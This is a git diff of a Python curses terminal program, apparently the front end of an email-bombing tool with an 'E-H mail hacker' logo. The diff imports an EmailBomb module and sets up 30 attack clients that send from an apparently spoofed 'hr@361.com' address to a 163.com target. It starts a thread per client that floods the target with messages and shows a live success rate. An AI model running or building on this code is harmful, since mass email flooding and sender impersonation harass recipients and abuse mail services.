@@ -1,19 +1,11 @@
-# encoding: utf8
-import curses
+# -*- coding: utf-8 -*-
+
+import EmailBomb
 import threading
+import curses
 import time
-import random
-
-
-class CtrlC(object):
-    def __init__(self, func):
-        self._func = func
-
-    def __call__(self):
-        try:
-            self._func()
-        except KeyboardInterrupt:
-            pass
+import locale
+locale.setlocale(locale.LC_ALL, '')
 
 
 class Screen:
@@ -33,40 +25,52 @@ class Screen:
     }
 
     def __init__(self):
+        self.too_small = False
+
         self.init_curses()
 
-        self.top = 1
-        self.items = ITEMS
-        self.bottom = len(self.items)+1
-        self.max_lines = curses.LINES-1
+        self.top = 0
+        self.bottom = len(CLIENTS)+1
+        self.max_lines = curses.LINES-len(LOGO)
 
         self.hori_len = 0
-
-        self.run()
+        self.EXIT_FLAG = 0
 
     def init_curses(self):
         """Setup the curses"""
         self.window = curses.initscr()
         self.height, self.width = self.window.getmaxyx()
+        if self.width < 60:
+            self.too_small = True
+            return
+
         self.window.keypad(True)
-        self.window.nodelay(True)
+        # self.window.nodelay(True)
 
         curses.noecho()
+        curses.curs_set(False)
         curses.cbreak()
+        curses.start_color()
+        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
+        curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)
+        curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLACK)
+        curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK)
+        curses.init_pair(5, curses.COLOR_WHITE, curses.COLOR_CYAN)
 
-    def put_color(self, color, bold=False):
+    def put_color(self, color, bold=True):
         bold = [bold, curses.A_BOLD][bold]
 
-        if color == "white":
-            return -1
-
-        return curses.color_pair(1) | curses.A_RIGHT
+        return {
+            "red": curses.color_pair(1),
+            "yellow": curses.color_pair(2),
+            "white": curses.color_pair(3),
+            "green": curses.color_pair(4),
+        }[color] | bold
 
     def input_stream(self):
         """Waiting an input and run a proper method according to type of input"""
-        while 1:
-            self.display()
 
+        while any([client.running for client in CLIENTS]):
             ch = self.window.getch()
 
             if ch == curses.KEY_UP:
@@ -82,56 +86,102 @@ class Screen:
                 self.scroll(self.RIGHT, horizontal=True)
 
             elif ch == ord("q"):
-                break
+                self.EXIT_FLAG = 1
 
     def display(self):
-        """Display the ITEMS on window"""
-        self.window.erase()
+        """Display the CLIENTS on window"""
+        condition = 1
+        while condition:
+            try:
+                self.window.erase()
+                if self.EXIT_FLAG:
+                    condition = any([client.running for client in CLIENTS])
+                    for client in CLIENTS:
+                        if not client.exit_flag:
+                            client.exit_flag = self.EXIT_FLAG
+                        else:
+                            if client.running:
+                                client.status = [(client.status_header, "exiting", "yellow")]
+                            else:
+                                client.status = [(client.status_header, "exited", "red")]
 
-        self.window.addstr(0, 0, "555")
+                for idx, item in enumerate(LOGO+CLIENTS[self.top:self.top + self.max_lines-1]):
+                    data = item.status[0] if len(item.status) == 1 else item.status.pop()
 
-        for idx, item in enumerate(self.items[self.top:self.top + self.max_lines]):
-            idx += 1
-            data = item.data
+                    len_data = len(data[0]+data[1])
+                    tmp_height, tmp_width = self.window.getmaxyx()
+                    '''
+                    self.width > len(data) > tmp_width: self.width √
+                    self.width > tmp_width > len(data): self.width
 
-            tmp_height, tmp_width = self.window.getmaxyx()
-            '''
-            self.width > len(data) > tmp_width: self.width √
-            self.width > tmp_width > len(data): self.width
+                    tmp_width > self.width > len(data): tmp_width
+                    tmp_width > len(data) > self.width: tmp_width √
 
-            tmp_width > self.width > len(data): tmp_width
-            tmp_width > len(data) > self.width: tmp_width √
+                    len(data) > tmp_width > self.width: len(data)
+                    len(data) > self.width > tmp_width: len(data) √
 
-            len(data) > tmp_width > self.width: len(data)
-            len(data) > self.width > tmp_width: len(data) √
+                    这样是不行的，别问我为啥 :D
+                    maxwidth = max(self.width, tmp_width, len(data))
+                    if maxwidth != self.width or 1:
+                        self.width = maxwidth
+                        self.window.resize(self.height, self.width)
+                    '''
 
-            这样是不行的，别问我为啥 :D
-            maxwidth = max(self.width, tmp_width, len(data))
-            if maxwidth != self.width or 1:
-                self.width = maxwidth
-                self.window.resize(self.height, self.width)
-            '''
+                    # 字符串长度超出默认 win 的长度，需要 resize
+                    if self.width < len_data:
+                        self.width = len_data
+                        self.window.resize(self.height, self.width)
+                        time.sleep(1)
 
-            # 字符串长度超出默认 win 的长度，需要 resize
-            if self.width < len(data):
-                self.width = len(data)
-                self.window.resize(self.height, self.width)
+                    # 终端宽度被调整，需要 resize
+                    if tmp_width != self.width:
+                        self.width = max(self.width, tmp_width)
+                        self.window.resize(self.height, self.width)
+                        time.sleep(1)
 
-            # 终端宽度被调整，需要 resize
-            if tmp_width != self.width:
-                self.width = max(self.width, tmp_width)
-                self.window.resize(self.height, self.width)
+                    # 终端高度被调整，需要 resize
+                    if tmp_height != self.height:
+                        self.max_lines = min(self.height, tmp_height)
+                        self.height = max(self.height, tmp_height)
+                        self.window.resize(self.height, self.width)
+                        self.top = 0
+                        time.sleep(1)
 
-            # 终端高度被调整，需要 resize
-            if tmp_height != self.height:
-                self.max_lines = min(self.height, tmp_height)+1
-                self.height = max(self.height, tmp_height)+1
-                self.window.resize(self.height, self.width)
-                self.top = 1
+                    try:
+                        self.window.addstr(idx, 0, data[0], self.put_color("white"))
+                        tmp_length = len(data[0])
+                        self.window.addstr(idx, tmp_length, data[1][self.hori_len:], self.put_color(data[2]))
+                    except Exception:
+                        self.EXIT_FLAG = 1
+                        break
+                        # self.window.addstr(idx, 0, "too small", self.put_color("white"))
 
-            self.window.addstr(idx, 0, data[self.hori_len:])
+                self.window.addstr(
+                    idx+1,
+                    0,
+                    "status: "+["running", "exiting"][self.EXIT_FLAG]+" "*2,
+                    curses.color_pair(5) | curses.A_BOLD
+                )
 
-        self.window.refresh()
+                success_num = 0
+                failed_num = 0.0001
+                for client in CLIENTS:
+                    failed_num += client.failed_num
+                    success_num += client.success_num
+
+                self.window.addstr(
+                    idx+1,
+                    17,
+                    "success: "+"{}%".format(round(success_num/(success_num+failed_num)*100, 2)),
+                    curses.color_pair(5) | curses.A_BOLD
+                )
+
+                self.window.refresh()
+
+                # time.sleep(0.5)
+
+            except KeyboardInterrupt:
+                self.EXIT_FLAG = 1
 
     def scroll(self, direction, horizontal=False):
         '''
@@ -158,75 +208,63 @@ class Screen:
 
     def run(self):
         """Continue running the TUI until get interrupted"""
-        global EXIT_FLAG
 
-        try:
-            self.input_stream()
-        except KeyboardInterrupt:
-            pass
+        self.display()
 
         # 兼容 iTerm2
         # os.system("printf '\e]50;ClearScrollback\a'")
-        # 兼容个屁 (:D
+        # 兼容个屁 :D
+
         curses.endwin()
 
         # screen 的线程结束的时候
         # 通知 process_data 结束
-        EXIT_FLAG = 0
 
 
-class Line:
-    '''
-    每一行为一个实例
-    '''
-
-    def __init__(self, id, data=""):
-        self.header = "{0:{fill}{align}{length}}".format(
-            "No."+str(id)+": ", length=len(str(THREADS_NUM))+5, fill=" ", align=">"
-        )  # 不变的数据头。使用空格进行右对齐
-
-        self.body = data  # 数据体，具体数据
-        self.data = self.header+self.body  # 真正展示出来的数据为 数据头+数据体
-
-    def update_body(self, data):
-        '''
-        更新数据体的时候也得更新真正展示出来的数据
-        '''
-
-        self.body = data
-        self.data = self.header+self.body
-
-
-@CtrlC
-def process_data():
-    '''
-    处理数据
-    这里更新的数据会在线程 thread_screen 中展示出来
-    '''
-
-    while EXIT_FLAG:
-        ITEMS[random.randint(0, THREADS_NUM-1)].update_body("attacking...")
-        time.sleep(0.5)
+class LOGOLine:
+    def __init__(self, data):
+        self.status = [(data, "", "red")]
 
 
 # ---------- 全局变量 -----------
-EXIT_FLAG = 1
+
+
+LOGO = [
+    LOGOLine(i) for i in [
+        "",
+        "███████╗     ██╗  ██╗",
+        "██╔════╝     ██║  ██║",
+        "█████╗       ███████║",
+        "██╔══╝       ██╔══██║",
+        "███████╗     ██║  ██║",
+        "╚══════╝mail ╚═╝  ╚═╝acker",
+        "",
+    ]
+]
 
 THREADS_NUM = 30
 
-# 每一行的数据
-ITEMS = [Line(num, "starting...") for num in range(THREADS_NUM)]
-
+CLIENTS = [
+    EmailBomb.EmailBomb(
+        id=id,
+        from_addr="hr@361.com",
+        to_addr="@163.com",
+    ) for id in range(THREADS_NUM)
+]  # 创建攻击 client
 # ------------------------------
+sc = Screen()  # 对接 CLI 展示数据
 
-"""
-thread_screen = threading.Thread(target=Screen)
-thread_screen.setDaemon(True)
-thread_screen.start()  # 启动线程 thread_screen 用于展示数据
-"""
 
-thread_data = threading.Thread(target=process_data)
-thread_data.setDaemon(True)
-thread_data.start()  # 启动线程 thread_data 用于处理数据
+if sc.too_small:
+    print("too small")
+else:
+    for client in CLIENTS:
+        thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
+        thread.setDaemon(True)
+        thread.start()  # 启动攻击 client
 
-Screen()
+    t = threading.Thread(target=sc.input_stream)
+    t.setDaemon(True)
+    t.start()
+
+    sc.run()
